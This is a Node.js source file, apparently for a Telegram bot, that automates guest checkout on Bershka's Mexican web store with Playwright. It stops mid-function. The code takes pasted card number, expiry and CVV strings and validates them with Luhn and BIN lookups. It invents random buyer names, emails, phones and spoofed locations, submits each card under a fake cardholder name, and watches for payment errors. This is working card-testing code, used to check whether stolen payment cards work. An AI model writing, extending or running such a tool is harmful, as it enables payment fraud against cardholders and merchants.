require('dotenv').config();
'use strict';

const dns = require('dns');
dns.setDefaultResultOrder('ipv4first');

const https = require('https');
const http = require('http'); // 🌐 Servidor HTTP para Render
const path = require('path');
const { Telegraf } = require('telegraf');
const { chromium } = require('playwright');

// --- CONFIGURACIÓN BASE ---
const CONFIG = {
  defaultUrl: 'https://www.bershka.com/mx/pack-3-calcetines-color-c0p229737233.html?colorId=600',
  headless: true, // 👻 Obligatorio en true para servidores en la nube (Render)
  timeout: parseInt(process.env.TIMEOUT_MS, 10) || 45000
};

// --- CONSULTA DE BIN ROBUSTA Y FUNCIONAL ---
function consultarBin(bin) {
  return new Promise((resolve) => {
    const binLimpio = String(bin).replace(/\D/g, '').slice(0, 6);

    const respuestaPorDefecto =
      '  ➲ Desconocida\n' +
      '  ➲ Desconocido\n' +
      '  ➲ Desconocido\n' +
      '  ➲ —';

    if (binLimpio.length < 6) {
      return resolve(respuestaPorDefecto);
    }

    const url = `https://lookup.binlist.net/${binLimpio}`;
    
    https.get(url, { headers: { 'User-Agent': 'Mozilla/5.0', 'Accept-Version': '3' } }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          if (res.statusCode === 200) {
            const info = JSON.parse(data);
            const marca = (info.scheme || info.brand || 'Desconocida').toUpperCase();
            const tipo = info.type ? (info.type.charAt(0).toUpperCase() + info.type.slice(1)) : 'Desconocido';
            const banco = info.bank && info.bank.name ? info.bank.name : 'Desconocido';
            let pais = info.country && info.country.name ? info.country.name : '—';
            if (info.country && info.country.alpha2 === 'MX') {
              pais = 'México 🇲🇽';
            } else if (info.country && info.country.emoji) {
              pais = `${pais} ${info.country.emoji}`;
            }

            return resolve(
              `  ➲ ${marca}\n` +
              `  ➲ ${tipo}\n` +
              `  ➲ ${banco}\n` +
              `  ➲ ${pais}`
            );
          }
        } catch (e) {}

        consultarVerikoMx(binLimpio, resolve, respuestaPorDefecto);
      });
    }).on('error', () => {
      consultarVerikoMx(binLimpio, resolve, respuestaPorDefecto);
    });
  });
}

function consultarVerikoMx(binLimpio, resolve, respuestaPorDefecto) {
  const opciones = {
    hostname: 'api.veriko.mx',
    path: `/v1/public/bin-lookup/${binLimpio}`,
    method: 'GET',
    headers: { 'User-Agent': 'Mozilla/5.0' }
  };

  const req = https.request(opciones, (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      try {
        if (res.statusCode === 200) {
          const info = JSON.parse(data);
          const marca = info.card_network || info.scheme || 'Desconocida';
          const tipo = info.card_type || info.type || 'Desconocido';
          const banco = info.institution || (info.bank && info.bank.name) || 'Desconocido';
          const pais = info.country === 'MX' ? 'México 🇲🇽' : (info.country || '—');

          return resolve(
            `  ➲ ${marca}\n` +
            `  ➲ ${tipo}\n` +
            `  ➲ ${banco}\n` +
            `  ➲ ${pais}`
          );
        }
      } catch (_) {}
      resolve(respuestaPorDefecto);
    });
  });

  req.on('error', () => resolve(respuestaPorDefecto));
  req.setTimeout(4000, () => { req.destroy(); resolve(respuestaPorDefecto); });
  req.end();
}

// --- SISTEMA DE REGISTRO DIAGNÓSTICO SEGURO ---
function logDiagnostico(categoria) {
  const timestamp = new Date().toISOString();
  const memoriaRss = Math.round(process.memoryUsage().rss / 1024 / 1024);
  console.error(`[${timestamp}] [DIAGNOSTICO] [${categoria}] [RAM: ${memoriaRss}MB]`);
}

function logStep(step, detail, status) {
  const timestamp = new Date().toISOString();
  const memoriaRss = Math.round(process.memoryUsage().rss / 1024 / 1024);
  const icon = status === true ? '✅' : (status === false ? '❌' : '🔄');
  console.error(`[${timestamp}] [STEP ${icon}] ${step} | ${detail} | RAM: ${memoriaRss}MB`);
}

process.on('uncaughtException', (err) => {
  logDiagnostico('FATAL_UNCAUGHT_EXCEPTION');
  console.error('Error fatal no capturado:', err);
  process.nextTick(() => process.exit(1));
});

process.on('unhandledRejection', (reason) => {
  logDiagnostico('UNHANDLED_REJECTION');
  console.error('Rechazo no manejado:', reason);
});

// Ubicaciones de cobertura en México con tiendas físicas
const CIUDADES_MEXICO = [
  { nombre: 'Monterrey, Nuevo León', cp: '64620', lada: '81', lat: 25.6815, lng: -100.3541, tz: 'America/Monterrey' },
  { nombre: 'Guadalajara, Jalisco', cp: '45030', lada: '33', lat: 20.6766, lng: -103.4319, tz: 'America/Mexico_City' },
  { nombre: 'Cancún, Quintana Roo', cp: '77500', lada: '998', lat: 21.1466, lng: -86.8225, tz: 'America/Cancun' },
  { nombre: 'Mérida, Yucatán', cp: '97115', lada: '999', lat: 21.0405, lng: -89.6315, tz: 'America/Merida' },
  { nombre: 'Tijuana, Baja California', cp: '22010', lada: '664', lat: 32.5262, lng: -117.0185, tz: 'America/Tijuana' },
  { nombre: 'Puebla, Puebla', cp: '72450', lada: '222', lat: 19.0315, lng: -98.2325, tz: 'America/Mexico_City' },
  { nombre: 'Querétaro, Querétaro', cp: '76127', lada: '442', lat: 20.6745, lng: -100.4368, tz: 'America/Mexico_City' },
  { nombre: 'León, Guanajuato', cp: '37150', lada: '477', lat: 21.1566, lng: -101.6946, tz: 'America/Mexico_City' },
  { nombre: 'Chihuahua, Chihuahua', cp: '31110', lada: '614', lat: 28.6275, lng: -106.1145, tz: 'America/Chihuahua' },
  { nombre: 'San Luis Potosí, SLP', cp: '78216', lada: '444', lat: 22.1398, lng: -101.0312, tz: 'America/Mexico_City' },
  { nombre: 'Aguascalientes, Ags.', cp: '20116', lada: '449', lat: 21.9242, lng: -102.2895, tz: 'America/Mexico_City' },
  { nombre: 'Veracruz, Veracruz', cp: '94299', lada: '229', lat: 19.1408, lng: -96.1038, tz: 'America/Mexico_City' },
  { nombre: 'Morelia, Michoacán', cp: '58350', lada: '443', lat: 19.6736, lng: -101.1611, tz: 'America/Mexico_City' },
  { nombre: 'Saltillo, Coahuila', cp: '25279', lada: '844', lat: 25.4589, lng: -100.9765, tz: 'America/Monterrey' },
  { nombre: 'Culiacán, Sinaloa', cp: '80020', lada: '667', lat: 24.8152, lng: -107.3992, tz: 'America/Mazatlan' },
  { nombre: 'Villahermosa, Tabasco', cp: '86035', lada: '993', lat: 17.9995, lng: -92.9462, tz: 'America/Mexico_City' },
  { nombre: 'Tuxtla Gutiérrez, Chiapas', cp: '29020', lada: '961', lat: 16.7544, lng: -93.1492, tz: 'America/Mexico_City' },
  { nombre: 'Toluca, Estado de México', cp: '52140', lada: '722', lat: 19.2598, lng: -99.6194, tz: 'America/Mexico_City' },
  { nombre: 'Cuautitlán Izcalli, Edo. Méx.', cp: '54700', lada: '55', lat: 19.6548, lng: -99.2116, tz: 'America/Mexico_City' },
  { nombre: 'Cuernavaca, Morelos', cp: '62370', lada: '777', lat: 18.9338, lng: -99.1965, tz: 'America/Mexico_City' },
  { nombre: 'Pachuca, Hidalgo', cp: '42083', lada: '771', lat: 20.0975, lng: -98.7675, tz: 'America/Mexico_City' },
  { nombre: 'Xalapa, Veracruz', cp: '91193', lada: '228', lat: 19.5142, lng: -96.8768, tz: 'America/Mexico_City' },
  { nombre: 'Torreón, Coahuila', cp: '27018', lada: '871', lat: 25.5812, lng: -103.4052, tz: 'America/Monterrey' },
  { nombre: 'Ciudad de México, CDMX', cp: '06000', lada: '55', lat: 19.4335, lng: -99.1402, tz: 'America/Mexico_City' }
];

const NOMBRES_MEXICO = [
  'Carlos', 'Alejandro', 'Miguel', 'Sofía', 'Valeria', 'Jorge', 'Daniel', 'Andrea',
  'Emiliano', 'Sebastián', 'Mateo', 'Leonardo', 'Diego', 'Santiago', 'Gael', 'Rodrigo',
  'Mauricio', 'Patricio', 'Andrés', 'Adrián', 'Fernando', 'Javier', 'Eduardo', 'Ricardo',
  'Gabriel', 'Camila', 'Renata', 'Ximena', 'Regina', 'Fernanda', 'Mariana', 'Natalia',
  'Paulina', 'Victoria', 'Lucía', 'Paola', 'Alejandra', 'Gabriela', 'Valentina', 'Carolina', 'Elena'
];

const APELLIDOS_MEXICO = [
  'García', 'Martínez', 'López', 'González', 'Pérez', 'Sánchez', 'Ramírez', 'Torres',
  'Hernández', 'Flores', 'Rivera', 'Gómez', 'Díaz', 'Reyes', 'Morales', 'Vázquez',
  'Jiménez', 'Gutiérrez', 'Ruiz', 'Mendoza', 'Aguilar', 'Ortiz', 'Moreno', 'Castillo',
  'Romero', 'Álvarez', 'Méndez', 'Chávez', 'Juárez', 'Domínguez', 'Herrera', 'Medina',
  'Castro', 'Vargas', 'Guzmán', 'Velázquez', 'Rojas', 'Contreras'
];

const DOMINIOS_CORREO = ['gmail.com', 'outlook.com', 'hotmail.com', 'icloud.com', 'yahoo.com'];

// --- UTILIDADES ---
function limpiarAcentos(str) {
  return str.normalize('NFD').replace(/[\u0300-\u036f]/g, '').toLowerCase().replace(/[^a-z0-9]/g, '');
}

function generarNombreCompleto() {
  const n1 = NOMBRES_MEXICO[Math.floor(Math.random() * NOMBRES_MEXICO.length)];
  const a1 = APELLIDOS_MEXICO[Math.floor(Math.random() * APELLIDOS_MEXICO.length)];
  let a2 = APELLIDOS_MEXICO[Math.floor(Math.random() * APELLIDOS_MEXICO.length)];
  if (a2 === a1) {
    a2 = APELLIDOS_MEXICO[(APELLIDOS_MEXICO.indexOf(a1) + 7) % APELLIDOS_MEXICO.length];
  }
  
  return {
    nom: n1,
    ape: `${a1} ${a2}`,
    completo: `${n1} ${a1} ${a2}`.toUpperCase()
  };
}

function generarDatosClienteAleatorio(ubicacion) {
  const persona = generarNombreCompleto();
  const sufijoUnico = `${Date.now().toString(36).slice(-4)}${Math.floor(100 + Math.random() * 900)}`;
  const dominio = DOMINIOS_CORREO[Math.floor(Math.random() * DOMINIOS_CORREO.length)];
  const email = `${limpiarAcentos(persona.nom)}.${limpiarAcentos(persona.ape.split(' ')[0])}${sufijoUnico}@${dominio}`;

  const lada = String(ubicacion?.lada || '55');
  const digitosRestantes = 10 - lada.length;
  let resto = '';
  for (let i = 0; i < digitosRestantes; i++) {
    resto += String(i === 0 ? Math.floor(2 + Math.random() * 8) : Math.floor(Math.random() * 10));
  }

  return {
    nombre: persona.nom,
    apellidos: persona.ape,
    email,
    telefono: `${lada}${resto}`
  };
}

function elegirUbicacionAleatoriaMexico() {
  const base = CIUDADES_MEXICO[Math.floor(Math.random() * CIUDADES_MEXICO.length)];
  const jitterLat = (Math.random() - 0.5) * 0.02;
  const jitterLng = (Math.random() - 0.5) * 0.02;
  return {
    nombre: base.nombre,
    cp: base.cp,
    lada: base.lada,
    tz: base.tz,
    latitude: Number((base.lat + jitterLat).toFixed(6)),
    longitude: Number((base.lng + jitterLng).toFixed(6)),
    accuracy: Math.floor(15 + Math.random() * 25)
  };
}

function productUrl() {
  const raw = String(process.env.ENLACE || CONFIG.defaultUrl).trim().replace(/^ENLACE\s*=\s*/i, '').replace(/^["']|["']$/g, '');
  const url = new URL(raw);
  if (url.protocol !== 'https:' || !['bershka.com', 'www.bershka.com'].includes(url.hostname)) {
    throw new Error('ENLACE debe ser una URL válida HTTPS de Bershka.');
  }
  return url.href;
}

function luhnCheck(numStr) {
  let sum = 0;
  let alternate = false;
  for (let i = numStr.length - 1; i >= 0; i--) {
    let n = parseInt(numStr[i], 10);
    if (alternate) {
      n *= 2;
      if (n > 9) n -= 9;
    }
    sum += n;
    alternate = !alternate;
  }
  return (sum % 10 === 0);
}

function parsearDatosTarjeta(texto, today = new Date()) {
    if (!texto) return { valido: false };
    
    const partes = texto.split(/[|\s/;,]+/).map(p => p.trim()).filter(Boolean);
    
    let tarjeta = '', mes = '', anioStr = '', cvv = '';

    if (partes.length >= 4) {
        tarjeta = partes[0];
        mes = partes[1];
        anioStr = partes[2];
        cvv = partes[3];
    } else if (partes.length === 3) {
        tarjeta = partes[0];
        const mesAnioStr = partes[1];
        cvv = partes[2];
        if (mesAnioStr.length >= 4) {
            mes = mesAnioStr.slice(0, 2);
            anioStr = mesAnioStr.slice(2);
        }
    }

    if (mes && mes.length === 1) mes = '0' + mes;

    let anio4D = '';
    let anio2D = '';
    if (anioStr.length === 2) {
        anio2D = anioStr;
        anio4D = '20' + anioStr;
    } else if (anioStr.length === 4) {
        anio4D = anioStr;
        anio2D = anioStr.slice(-2);
    }

    const tarjetaValida = /^\d{15,16}$/.test(tarjeta) && luhnCheck(tarjeta);
    const mesValido = /^(0[1-9]|1[0-2])$/.test(mes);
    const numAnio = parseInt(anio4D, 10);
    
    const anioValido = !isNaN(numAnio) && numAnio >= 2026 && numAnio <= 2099;
    const cvvValido = /^\d{3,4}$/.test(cvv);

    if (tarjetaValida && mesValido && anioValido && cvvValido) {
        const personaAleatoria = generarNombreCompleto();
        return {
            valido: true,
            numero: tarjeta,
            tarjeta,
            mes,
            anio: anio2D,
            anioCompleto: anio4D,
            fechaMMAA: `${mes}/${anio2D}`,
            cvv,
            ult4: tarjeta.slice(-4),
            nombreTitular: personaAleatoria.completo
        };
    }

    return { valido: false };
}

// --- CERRAR BANNER COOKIES ---
async function cerrarBannerCookies(page) {
  try {
    const btnAceptar = page.locator('#onetrust-accept-btn-handler, button:has-text("Aceptar todas"), button:has-text("Aceptar")').first();
    if (await btnAceptar.isVisible({ timeout: 2500 }).catch(() => false)) {
      await btnAceptar.click({ timeout: 1500 }).catch(() => {});
    }
  } catch (_) {}
}

// --- AUTOMATIZACIÓN DE FLUJO ---
async function waitForHydrationAndVisuals(page) {
  for (let attempt = 1; attempt <= 4; attempt++) {
    await page.locator('.size-selector__list button.size-button').first().waitFor({ state: 'visible', timeout: CONFIG.timeout });
    await page.locator('button[data-qa-anchor="addToCartBtn"]').first().waitFor({ state: 'visible', timeout: CONFIG.timeout });

    await page.waitForFunction(
      () => Boolean(window.$nuxt && window.$nuxt.$children && window.$nuxt.$children.length),
      { timeout: 12000, polling: 150 }
    ).catch(() => {});
    await page.waitForTimeout(700);

    const hydrated = await page.evaluate(() => {
      function findVm(vm, name) {
        if (!vm) return null;
        if ((vm.$options?.name || vm.$options?._componentTag) === name) return vm;
        for (const c of vm.$children || []) {
          const found = findVm(c, name);
          if (found) return found;
        }
        return null;
      }
      if (!window.$nuxt) return false;
      const sizeVm = findVm(window.$nuxt, 'SizeSelector');
      const addVm = findVm(window.$nuxt, 'AddToCartButton');
      return Boolean(sizeVm?._isMounted && addVm?._isMounted);
    });

    if (hydrated) {
      await page.waitForTimeout(500);
      return await page.evaluate(() => ({
        readyState: document.readyState,
        images: [...document.images].filter(i => i.getBoundingClientRect().width > 40).length,
        imagesLoaded: [...document.images].filter(i => i.getBoundingClientRect().width > 40 && i.complete && i.naturalWidth > 0).length,
        sizeButtons: document.querySelectorAll('.size-selector__list button.size-button').length
      }));
    }
    await page.reload({ waitUntil: 'domcontentloaded', timeout: CONFIG.timeout });
  }
  throw new Error('Error al completar la hidratación del sitio web.');
}

async function selectAvailableSize(page) {
  const buttons = page.locator('.size-selector__list button.size-button');
  for (const size of ['M', 'L', 'S', 'XL']) {
    const button = buttons.filter({
      has: page.locator('.size-button__label', { hasText: new RegExp(`^\\s*${size}\\s*$`, 'i') })
    }).first();
    if (!await button.count() || !await button.isVisible() || !await button.isEnabled()) continue;

    await button.scrollIntoViewIfNeeded().catch(() => {});
    await button.click({ timeout: 15000 });
    await page.waitForTimeout(600);
    return size;
  }
  throw new Error('No se encontraron tallas activas/disponibles.');
}

async function addToCartAndProceedToCheckout(page, steps, ubicacion) {
  const add = page.locator('button[data-qa-anchor="addToCartBtn"]').first();
  await add.waitFor({ state: 'visible', timeout: 20000 });

  for (let attempt = 1; attempt <= 3; attempt++) {
    await add.click({ timeout: 15000 });
    const tramitarBtn = page.locator(
      'button.product-added-product-info__link, [data-qa-anchor="processOrderBtn"], button:has-text("Tramitar pedido"), a:has-text("Tramitar pedido")'
    ).first();

    const appeared = await tramitarBtn.waitFor({ state: 'visible', timeout: 8000 }).then(() => true).catch(() => false);
    if (appeared) {
      steps.push('Añadido a la cesta');
      await tramitarBtn.click({ timeout: 15000 });
      steps.push('Clic en Tramitar pedido');
      break;
    }
    if (attempt < 3) await selectAvailableSize(page);
    else throw new Error('Botón de tramitar pedido no interactuable.');
  }

  const guestBtn = page.locator(
    'a[data-qa-anchor="registerCheckout"]:has-text("Continuar sin registro"), button:has-text("Continuar sin registro"), a:has-text("Continuar sin registro")'
  ).first();
  await guestBtn.waitFor({ state: 'visible', timeout: 20000 });
  await guestBtn.click({ timeout: 15000 });
  steps.push('Clic en Continuar sin registro');

  await page.waitForURL(/checkout\.html/i, { timeout: 30000 });
  const entregaTienda = page.locator(
    '[data-qa-anchor="shippingMethodCard"]:has-text("Entrega en tienda") label, [data-qa-anchor="shippingMethodCard"]:has-text("Entrega en tienda"), label:has-text("Entrega en tienda")'
  ).first();
  await entregaTienda.waitFor({ state: 'visible', timeout: 30000 });
  await entregaTienda.click({ timeout: 15000 });
  steps.push('Entrega en tienda seleccionada');

  const continuarBtn = page.locator(
    '.shipping__footer button:has-text("Continuar"), button.button-with-tooltip__button:has-text("Continuar"), button:has-text("Continuar")'
  ).first();
  await continuarBtn.waitFor({ state: 'visible', timeout: 20000 });
  await continuarBtn.click({ timeout: 15000 });

  await page.locator('#checkout-shipping-pickup-search').waitFor({ state: 'attached', timeout: 20000 }).catch(() => {});
  
  const pickupResult = await page.evaluate(async (loc) => {
    const formEl = document.querySelector('#checkout-shipping-pickup-search');
    const pickupVm = formEl?.__vue__?.$parent?.$parent;
    if (!pickupVm) return { ok: false };
    pickupVm.showSkeleton = false;
    try {
      if (typeof pickupVm.onMoveAroundMap === 'function') {
        await pickupVm.onMoveAroundMap({ latitude: loc.latitude, longitude: loc.longitude });
      }
    } catch (_) {}
    pickupVm.showSkeleton = false;
    pickupVm.showResults = true;

    const inputEl = document.querySelector('#checkout-shipping-pickup-search_address');
    if (inputEl && loc.cp) {
      inputEl.value = loc.cp;
      inputEl.dispatchEvent(new Event('input', { bubbles: true }));
    }

    const stores = Array.isArray(pickupVm.physicalStores) ? pickupVm.physicalStores : [];
    const firstStore = stores[0] || null;
    if (firstStore && typeof pickupVm.selectPickup === 'function') {
      pickupVm.selectPickup(firstStore);
    }
    return { ok: true, firstStore: firstStore?.name || null };
  }, { latitude: ubicacion.latitude, longitude: ubicacion.longitude, cp: ubicacion.cp });

  if (pickupResult.firstStore) steps.push(`Tienda: ${pickupResult.firstStore}`);

  await page.waitForTimeout(1200);
  
  const storeOption = page.locator('.store-list__item, [data-qa-anchor="pickupStoreItem"], .store-item').first();
  if (await storeOption.isVisible().catch(() => false)) {
    await storeOption.click({ timeout: 5000 }).catch(() => {});
  }

  await page.evaluate(async () => {
    const formEl = document.querySelector('#checkout-shipping-pickup-search');
    const pickupVm = formEl?.__vue__?.$parent?.$parent;
    if (pickupVm && typeof pickupVm.handleSelect === 'function') await pickupVm.handleSelect();
  });

  await page.waitForTimeout(1000);

  const confirmStoreBtn = page.locator('button:has-text("Seleccionar esta tienda"), button:has-text("Continuar"), button:has-text("Aceptar")').last();
  if (await confirmStoreBtn.isVisible().catch(() => false)) {
    await confirmStoreBtn.click({ timeout: 5000 }).catch(() => {});
  }

  await page.locator('text=/RECOGIDA EN TIENDA|MIS DATOS|RESUMEN DE LA COMPRA/i').first().waitFor({ state: 'visible', timeout: 15000 }).catch(() => {});

  const cliente = generarDatosClienteAleatorio(ubicacion);
  const inputsMisDatos = page.locator(
    'input[htmlid^="checkout-shipping-pickup_"]:not([hidden]):not([alwayshidden="true"]):not([readonly]), form#checkout-shipping-pickup input.bds-styled-input__input:not([hidden]):not([alwayshidden="true"]):not([readonly])'
  );
  await inputsMisDatos.first().waitFor({ state: 'visible', timeout: 15000 });

  const valores = [cliente.nombre, cliente.apellidos, cliente.email, cliente.telefono];
  const count = await inputsMisDatos.count();
  for (let i = 0; i < Math.min(valores.length, count); i++) {
    const input = inputsMisDatos.nth(i);
    await input.click({ timeout: 10000 });
    await input.fill(valores[i]);
    await input.press('Tab').catch(() => {});
    await page.waitForTimeout(200);
  }
  steps.push(`Datos: ${cliente.nombre} ${cliente.apellidos}`);

  const btnContinuarDatos = page.locator('button#checkout-shipping-pickup_submit, button[type="submit"].bds-button--primary').last();
  await btnContinuarDatos.waitFor({ state: 'visible', timeout: 15000 });
  await btnContinuarDatos.scrollIntoViewIfNeeded().catch(() => {});
  await btnContinuarDatos.click({ timeout: 15000 });
  steps.push('Clic en Continuar (Mis Datos)');

  await page.locator('text=/ELIGE UN MÉTODO DE PAGO|TARJETA BANCARIA/i').first().waitFor({ state: 'visible', timeout: 20000 });
}

async function autocompletar_datos(page, dato_numero, dato_vencimiento, dato_cvv, nombre_aleatorio) {
  let targetContext = page;
  const iframeElements = page.locator('iframe');
  const iframeCount = await iframeElements.count();
  
  for (let i = 0; i < iframeCount; i++) {
    const frameObj = iframeElements.nth(i);
    try {
      const frame = await frameObj.contentFrame();
      if (frame) {
        const inputCheck = frame.locator('input').first();
        if (await inputCheck.isVisible().catch(() => false)) {
          targetContext = frame;
          break;
        }
      }
    } catch (e) {
      logDiagnostico('IFRAME_CROSS_ORIGIN');
    }
  }

  let casillaNumero = targetContext.locator('input[placeholder*="NÚMERO"], input[aria-label*="NÚMERO"]').first();
  if (!await casillaNumero.isVisible().catch(() => false)) {
    casillaNumero = targetContext.locator('label:has-text("NÚMERO DE LA TARJETA")').locator('xpath=following::input[1]').first();
  }
  if (!await casillaNumero.isVisible().catch(() => false)) {
    casillaNumero = targetContext.locator('input.bds-styled-input__input, input').first();
  }

  await casillaNumero.waitFor({ state: 'visible', timeout: 20000 });
  await casillaNumero.click();
  await casillaNumero.fill(dato_numero);

  let casillaVencimiento = targetContext.locator('input[placeholder*="VÁLIDA"], input[placeholder*="MM"], input[aria-label*="VÁLIDA"]').first();
  if (!await casillaVencimiento.isVisible().catch(() => false)) {
    casillaVencimiento = targetContext.locator('label:has-text("VÁLIDA HASTA")').locator('xpath=following::input[1]').first();
  }
  if (!await casillaVencimiento.isVisible().catch(() => false)) {
    casillaVencimiento = targetContext.locator('input.bds-styled-input__input, input').nth(1);
  }

  await casillaVencimiento.waitFor({ state: 'visible', timeout: 15000 });
  await casillaVencimiento.click();
  await casillaVencimiento.fill(dato_vencimiento);

  let casillaCvv = targetContext.locator('input[placeholder*="CVV"], input[aria-label*="CVV"]').first();
  if (!await casillaCvv.isVisible().catch(() => false)) {
    casillaCvv = targetContext.locator('label:has-text("CVV")').locator('xpath=following::input[1]').first();
  }
  if (!await casillaCvv.isVisible().catch(() => false)) {
    casillaCvv = targetContext.locator('input.bds-styled-input__input, input').nth(2);
  }

  await casillaCvv.waitFor({ state: 'visible', timeout: 15000 });
  await casillaCvv.click();
  await casillaCvv.fill(dato_cvv);

  let casillaTitular = targetContext.locator('input[placeholder*="TITULAR"], input[aria-label*="TITULAR"]').first();
  if (!await casillaTitular.isVisible().catch(() => false)) {
    casillaTitular = targetContext.locator('label:has-text("TITULAR DE TARJETA")').locator('xpath=following::input[1]').first();
  }
  if (!await casillaTitular.isVisible().catch(() => false)) {
    casillaTitular = targetContext.locator('input.bds-styled-input__input, input').nth(3);
  }

  if (await casillaTitular.isVisible().catch(() => false)) {
    await casillaTitular.click();
    await casillaTitular.fill(nombre_aleatorio);
  }

  await targetContext.waitForTimeout(500);

  // --- MANEJO SEGURO Y NO BLOQUEANTE DE MODALIDAD DE PAGO ---
  try {
    const btnDropdownModalidad = targetContext.locator('button:has-text("MODALIDAD DE PAGO"), [data-qa-anchor*="payment-modality"], .bds-dropdown__header, label:has-text("MODALIDAD DE PAGO"), div:has-text("MODALIDAD DE PAGO")').first();
    if (await btnDropdownModalidad.isVisible({ timeout: 2000 }).catch(() => false)) {
      await btnDropdownModalidad.click({ force: true }).catch(() => {});
      await targetContext.waitForTimeout(400);

      const opcionImmediate = targetContext.locator('span.bds-dropdown-option__label, li, [role="option"]').filter({ hasText: /immediate|inmediat|pago/i }).first();
      if (await opcionImmediate.isVisible({ timeout: 1500 }).catch(() => false)) {
        await opcionImmediate.click({ force: true }).catch(() => {});
      } else {
        await targetContext.keyboard.press('ArrowDown').catch(() => {});
        await targetContext.keyboard.press('Enter').catch(() => {});
      }
    }
  } catch (_) {
    await targetContext.keyboard.press('Escape').catch(() => {});
  }

  await targetContext.waitForTimeout(500);
}

// --- FLUJO PRINCIPAL DE NAVEGACIÓN Y PAGO ---
async function runNavigation(browser, datosTarjeta) {
  const steps = [];
  const ubicacion = elegirUbicacionAleatoriaMexico();
  steps.push(`📍 ${ubicacion.nombre}`);

  const context = await browser.newContext({
    timezoneId: 'America/Mexico_City',
    locale: 'es-MX',
    viewport: null,
    geolocation: { latitude: ubicacion.latitude, longitude: ubicacion.longitude, accuracy: ubicacion.accuracy },
    permissions: ['geolocation']
  });

  await context.grantPermissions(['geolocation'], { origin: 'https://www.bershka.com' }).catch(() => {});
  const page = await context.newPage();
  page.setDefaultTimeout(CONFIG.timeout);

  try {
    await page.goto(productUrl(), { waitUntil: 'domcontentloaded', timeout: 90000 });
    
    // ⏱️ Espera exacta de 5.55 segundos para asegurar la carga completa de la página
    await page.waitForTimeout(5550);

    // 🍪 Cerrar banner de cookies inmediatamente
    await cerrarBannerCookies(page);

    await waitForHydrationAndVisuals(page);
    const size = await selectAvailableSize(page);
    steps.push(`Talla ${size}`);
    await addToCartAndProceedToCheckout(page, steps, ubicacion);

    const tarjetaBancaria = page.locator(
      'label:has-text("Tarjeta bancaria"), [data-qa-anchor="paymentMethodCard"]:has-text("Tarjeta bancaria"), .base-list-item__headline:has-text("Tarjeta bancaria"), label[for*="bds-list-selection-item"]'
    ).first();

    await tarjetaBancaria.waitFor({ state: 'visible', timeout: 25000 });
    await page.waitForTimeout(400);
    await tarjetaBancaria.scrollIntoViewIfNeeded().catch(() => {});
    await tarjetaBancaria.click({ timeout: 15000, force: true });
    steps.push('Tarjeta bancaria seleccionada');

    await page.waitForTimeout(500);
    const selectorContinuar = 'button.bds-button.button-with-tooltip__button.bds-button--primary';
    await page.waitForSelector(selectorContinuar, { visible: true, timeout: 15000 });
    await Promise.all([
      page.waitForNavigation({ waitUntil: 'domcontentloaded' }).catch(() => {}),
      page.click(selectorContinuar, { force: true }),
    ]);
    steps.push('Clic en Continuar (Método de Pago)');

    await page.waitForTimeout(1500);
    await autocompletar_datos(page, datosTarjeta.numero, datosTarjeta.fechaMMAA, datosTarjeta.cvv, datosTarjeta.nombreTitular);
    steps.push(`Titular generado: ${datosTarjeta.nombreTitular}`);
    await page.waitForTimeout(500);

    const btnRevisar = page.locator('button:has-text("REVISAR PEDIDO"), button:has-text("Revisar pedido")').last();
    await btnRevisar.waitFor({ state: 'visible', timeout: 20000 });
    await btnRevisar.scrollIntoViewIfNeeded().catch(() => {});
    await Promise.all([
      page.waitForNavigation({ waitUntil: 'domcontentloaded' }).catch(() => {}),
      btnRevisar.click({ timeout: 15000 })
    ]);
    steps.push('Clic en Revisar Pedido');

    await page.waitForTimeout(1500);
    await page.evaluate(() => window.scrollTo(0, document.body.scrollHeight));
    await page.waitForTimeout(600);

    const textoAcepto = page.locator('label:has-text("Acepto"), span:has-text("Acepto"), div:has-text("Acepto: Condiciones")').last();
    await textoAcepto.waitFor({ state: 'visible', timeout: 20000 });
    await textoAcepto.scrollIntoViewIfNeeded().catch(() => {});
    await page.waitForTimeout(300);

    for (let intento = 1; intento <= 3; intento++) {
      const infoCasilla = await page.evaluate(() => {
        const labels = Array.from(document.querySelectorAll('label'));
        const labelAcepto = labels.find(l => l.textContent && l.textContent.includes('Acepto'));

        let input = null;
        if (labelAcepto && labelAcepto.htmlFor) {
          input = document.getElementById(labelAcepto.htmlFor);
        }
        if (!input && labelAcepto) {
          let parent = labelAcepto.parentElement;
          for (let i = 0; i < 4 && parent; i++) {
            const cb = parent.querySelector('input[type="checkbox"]');
            if (cb) {
              input = cb;
              break;
            }
            parent = parent.parentElement;
          }
        }
        if (!input) {
          const todos = Array.from(document.querySelectorAll('input[type="checkbox"]'));
          input = todos[todos.length - 1] || null;
        }

        if (input && input.checked) {
          return { yaMarcado: true };
        }

        const contenedor = input?.closest('.bds-checkbox') || labelAcepto?.parentElement || labelAcepto || input;
        if (contenedor) {
          const rect = contenedor.getBoundingClientRect();
          return {
            yaMarcado: false,
            x: Math.round(rect.left + 9),
            y: Math.round(rect.top + rect.height / 2)
          };
        }
        return { yaMarcado: false, x: null, y: null };
      });

      if (infoCasilla.yaMarcado) break;

      if (infoCasilla.x !== null && infoCasilla.y !== null) {
        await page.mouse.click(infoCasilla.x, infoCasilla.y);
      } else {
        await textoAcepto.click({ position: { x: 8, y: 10 }, force: true }).catch(() => {});
      }

      await page.waitForTimeout(350);

      const verificado = await page.evaluate(() => {
        const labels = Array.from(document.querySelectorAll('label'));
        const labelAcepto = labels.find(l => l.textContent && l.textContent.includes('Acepto'));
        let input = (labelAcepto?.htmlFor && document.getElementById(labelAcepto.htmlFor))
          || labelAcepto?.parentElement?.querySelector('input[type="checkbox"]')
          || Array.from(document.querySelectorAll('input[type="checkbox"]')).pop();

        if (!input) return false;
        if (!input.checked) {
          input.click();
        }
        return Boolean(input.checked);
      }).catch(() => false);

      if (verificado) break;
    }

    await page.waitForTimeout(400);

    const btnPagar = page.locator(
      'button:has-text("PAGA Y TRAMITA TU PEDIDO"), [data-qa-anchor*="pay" i]:has-text("PAGA")'
    ).last();
    await btnPagar.waitFor({ state: 'visible', timeout: 20000 });
    await btnPagar.scrollIntoViewIfNeeded().catch(() => {});
    await btnPagar.click({ timeout: 15000, force: true });
    steps.push('Clic en Paga y Tramita tu Pedido');

    const TIEMPO_ESPERA_MS = 10000;

    const resultadoPago = await Promise.race([
      page.waitForFunction(() => {
        const text = (document.body?.innerText || '').toLowerCase();
        return (
          text.includes('121') ||
          text.includes('ha habido un error con el pago') ||
          text.includes('error con el pago') ||
